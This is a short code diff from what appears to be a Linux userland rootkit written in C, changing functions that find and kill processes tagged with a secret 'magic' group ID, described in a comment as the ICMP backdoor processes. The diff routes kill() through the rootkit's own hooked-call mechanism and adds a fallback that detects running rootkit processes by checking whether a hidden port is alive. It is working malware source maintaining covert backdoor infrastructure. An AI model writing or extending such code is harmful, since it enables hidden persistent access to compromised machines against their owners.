@@ -22,20 +22,15 @@ void killrkprocs(gid_t magicgid){ // mainly for killing the icmp backdoor proces
             continue;
 
         if(sbuf.st_gid == magicgid){
-            pid = atoi(dir->d_name);
+            pid = (pid_t)atoi(dir->d_name);
             if(pid==getpid() || pid==getppid())
                 continue;
-            kill(pid, SIGKILL);
+            hook(CKILL);
+            call(CKILL, pid, SIGKILL);
         }
     }
     closedir(dirp);
 }
-
-
-/*
-    a better way of determining if there are rootkit processes up could be just checking if a secret port is in use.
-    not all users can see all processes in /proc.
- */
 
 int rkprocup(void){
     int status = 0;
@@ -52,7 +47,7 @@ int rkprocup(void){
     dp = call(COPENDIR, "/proc");
     if(dp == NULL) return 0;
 
-    while((dir = call(CREADDIR, dp)) != NULL){
+    while((dir = call(CREADDIR, dp)) != NULL && status != 1){
         if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
@@ -63,12 +58,15 @@ int rkprocup(void){
         if((long)call(C__XSTAT, _STAT_VER, procpath, &procstat) < 0)
             continue;
 
-        if(procstat.st_gid == magicgid){
+        if(procstat.st_gid == magicgid)
             status = 1;
-            break;
-        }
     }
 
     closedir(dp);
+
+    // assume the user wasn't able to properly determine status based on the contents of /proc
+    if(status != 1 && hideport_alive())
+        status = 1;
+
     return status;
 }
